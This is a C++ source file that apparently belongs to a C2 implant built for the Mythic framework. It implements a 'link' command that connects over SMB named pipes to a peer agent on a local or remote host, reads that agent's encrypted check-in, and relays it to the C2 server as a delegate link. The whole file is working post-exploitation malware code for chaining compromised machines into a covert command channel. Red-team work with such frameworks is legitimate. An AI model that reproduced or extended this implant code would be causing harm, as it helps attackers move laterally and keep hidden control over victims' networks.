#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>
#include <base64.h>
#include <crypto.h>

#ifdef INCLUDE_CMD_LINK

using namespace stardust;
using namespace starburst;

static auto declfn link_pipe_recv(
    _Inout_ instance& inst,
    _In_    HANDLE    pipe,
    _Out_   uint8_t** data,
    _Out_   uint32_t* len
) -> bool {
    *data = nullptr;
    *len  = 0;

    DWORD avail = 0;
    if ( !inst.kernel32.PeekNamedPipe( pipe, nullptr, 0, nullptr, &avail, nullptr ) )
        return false;
    if ( avail == 0 ) return false;

    uint8_t header[4] = {};
    DWORD   read_bytes = 0;
    if ( !inst.kernel32.ReadFile( pipe, header, 4, &read_bytes, nullptr ) || read_bytes != 4 )
        return false;

    uint32_t msg_size = ((uint32_t)header[0] << 24) |
                        ((uint32_t)header[1] << 16) |
                        ((uint32_t)header[2] << 8)  |
                        ((uint32_t)header[3]);

    if ( msg_size == 0 || msg_size > 0x3C00000 ) return false;

    auto buf = static_cast<uint8_t*>( inst.heap_alloc( msg_size ) );
    if ( !buf ) return false;

    uint32_t total_read = 0;
    while ( total_read < msg_size ) {
        uint32_t chunk = msg_size - total_read;
        if ( chunk > PIPE_BUFFER_MAX ) chunk = PIPE_BUFFER_MAX;

        read_bytes = 0;
        BOOL ok = inst.kernel32.ReadFile( pipe, buf + total_read, chunk, &read_bytes, nullptr );
        if ( !ok ) {
            DWORD err = inst.kernel32.GetLastError();
            if ( err == ERROR_MORE_DATA ) {
                total_read += read_bytes;
                continue;
            }
            inst.heap_free( buf );
            return false;
        }
        total_read += read_bytes;
    }

    *data = buf;
    *len  = msg_size;
    return true;
}

static auto declfn link_pipe_send(
    _Inout_ instance& inst,
    _In_    HANDLE    pipe,
    _In_    uint8_t*  data,
    _In_    uint32_t  len
) -> bool {
    uint8_t header[4];
    header[0] = (len >> 24) & 0xFF;
    header[1] = (len >> 16) & 0xFF;
    header[2] = (len >> 8)  & 0xFF;
    header[3] = len & 0xFF;

    DWORD written = 0;
    if ( !inst.kernel32.WriteFile( pipe, header, 4, &written, nullptr ) || written != 4 )
        return false;

    uint32_t offset = 0;
    while ( offset < len ) {
        uint32_t chunk = len - offset;
        if ( chunk > PIPE_BUFFER_MAX ) chunk = PIPE_BUFFER_MAX;

        written = 0;
        if ( !inst.kernel32.WriteFile( pipe, data + offset, chunk, &written, nullptr ) )
            return false;
        offset += written;
    }

    return true;
}

auto declfn starburst::cmd_link(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t host_len = 0;
    auto hostname = parser_string( params, &host_len );

    uint32_t pipe_len = 0;
    auto pipename = parser_string( params, &pipe_len );

    if ( !pipename || pipe_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "missing pipe name" ) ) );
        return;
    }

    // null-terminate parsed strings (parser_string returns non-terminated pointers)
    char host_buf[260] = {};
    if ( hostname && host_len > 0 ) {
        uint32_t cp = host_len > 259 ? 259 : host_len;
        memory::copy( host_buf, hostname, cp );
        host_buf[cp] = '\0';
    }

    char pipe_buf[260] = {};
    {
        uint32_t cp = pipe_len > 259 ? 259 : pipe_len;
        memory::copy( pipe_buf, pipename, cp );
        pipe_buf[cp] = '\0';
    }

    char pipe_path[520] = {};
    str_copy( pipe_path, symbol<char*>( const_cast<char*>( "\\\\" ) ) );

    if ( host_buf[0] != '\0' ) {
        str_concat( pipe_path, host_buf );
    } else {
        str_concat( pipe_path, symbol<char*>( const_cast<char*>( "." ) ) );
    }

    str_concat( pipe_path, symbol<char*>( const_cast<char*>( "\\pipe\\" ) ) );
    str_concat( pipe_path, pipe_buf );

    DBG_PRINT( inst, "link: connecting to %s\n", pipe_path );

    HANDLE h_remote = inst.kernel32.CreateFileA(
        pipe_path,
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr
    );

    if ( h_remote == INVALID_HANDLE_VALUE ) {
        char err_buf[256] = {};
        str_copy( err_buf, symbol<char*>( const_cast<char*>( "failed to connect to pipe: " ) ) );
        str_concat( err_buf, pipe_path );
        queue_response( inst, task_uuid, RESPONSE_ERROR, err_buf );
        return;
    }

    DBG_PRINT( inst, "link: connected to %s\n", pipe_path );

    auto link = static_cast<instance::SmbLink*>(
        inst.heap_alloc( sizeof( instance::SmbLink ) )
    );
    if ( !link ) {
        inst.kernel32.CloseHandle( h_remote );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    memory::zero( link, sizeof( instance::SmbLink ) );
    memory::copy( link->task_uuid, task_uuid, 36 );

    link->link_id   = inst.kernel32.GetTickCount() & 0x7FFFFFFF;
    link->h_pipe    = h_remote;
    link->connected = true;

    uint32_t pn_alloc = pipe_len + 1;
    link->pipe_name = static_cast<char*>( inst.heap_alloc( pn_alloc ) );
    if ( link->pipe_name ) {
        memory::copy( link->pipe_name, pipename, pipe_len );
        link->pipe_name[pipe_len] = '\0';
    }

    // read P2P agent's checkin - base64(UUID + AES(TLV))
    uint8_t* p2p_data = nullptr;
    uint32_t p2p_len  = 0;

    for ( int attempt = 0; attempt < 300; attempt++ ) {
        if ( link_pipe_recv( inst, h_remote, &p2p_data, &p2p_len ) ) break;
        LARGE_INTEGER delay;
        delay.QuadPart = -100000LL;
        inst.ntdll.NtDelayExecution( FALSE, &delay );
    }

    if ( !p2p_data || p2p_len == 0 ) {
        inst.kernel32.CloseHandle( h_remote );
        if ( link->pipe_name ) inst.heap_free( link->pipe_name );
        inst.heap_free( link );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no response from P2P agent" ) ) );
        return;
    }

    // extract agent UUID from decoded data (first 36 bytes after base64 decode)
    uint32_t decoded_len = 0;
    auto decoded = base64_decode( inst, p2p_data, p2p_len, &decoded_len );
    if ( decoded && decoded_len >= 36 ) {
        link->agent_id = static_cast<char*>( inst.heap_alloc( 37 ) );
        if ( link->agent_id ) {
            memory::copy( link->agent_id, decoded, 36 );
            link->agent_id[36] = '\0';
        }
    }
    if ( decoded ) inst.heap_free( decoded );

    link->next = inst.smb_links;
    inst.smb_links = link;

    DBG_PRINT( inst, "link: added link_id=%d agent=%s\n",
        link->link_id, link->agent_id ? link->agent_id : "unknown" );

    // queue ACTION_LINK_ADD - translator converts to Mythic delegate format
    auto pkg = package_create( inst );
    if ( !pkg ) {
        inst.heap_free( p2p_data );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    package_add_byte( inst, pkg, ACTION_LINK_ADD );
    package_add_byte( inst, pkg, C2_PROFILE_SMB );
    package_add_int32( inst, pkg, link->link_id );
    package_add_string( inst, pkg, link->agent_id ? link->agent_id :
        symbol<char*>( const_cast<char*>( "" ) ) );
    package_add_bytes( inst, pkg, p2p_data, p2p_len );

    inst.heap_free( p2p_data );

    uint32_t data_len = 0;
    auto data = package_build( pkg, &data_len );

    uint32_t needed = inst.response_queue.length + 4 + data_len;
    if ( needed > inst.response_queue.capacity ) {
        uint32_t new_cap = inst.response_queue.capacity == 0 ? 1024 : inst.response_queue.capacity;
        while ( new_cap < needed ) new_cap *= 2;
        inst.response_queue.buffer = static_cast<uint8_t*>(
            inst.heap_realloc( inst.response_queue.buffer, new_cap )
        );
        inst.response_queue.capacity = new_cap;
    }

    auto buf = inst.response_queue.buffer + inst.response_queue.length;
    buf[0] = (data_len >> 24) & 0xFF;
    buf[1] = (data_len >> 16) & 0xFF;
    buf[2] = (data_len >> 8)  & 0xFF;
    buf[3] = data_len & 0xFF;
    memory::copy( buf + 4, data, data_len );
    inst.response_queue.length += 4 + data_len;

    package_destroy( inst, pkg );

    char resp_buf[768] = {};
    str_copy( resp_buf, symbol<char*>( const_cast<char*>( "Linked via " ) ) );
    str_concat( resp_buf, pipe_path );
    str_concat( resp_buf, symbol<char*>( const_cast<char*>( "\nAgent: " ) ) );
    str_concat( resp_buf, link->agent_id ? link->agent_id :
        symbol<char*>( const_cast<char*>( "unknown" ) ) );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, resp_buf );
}

#endif
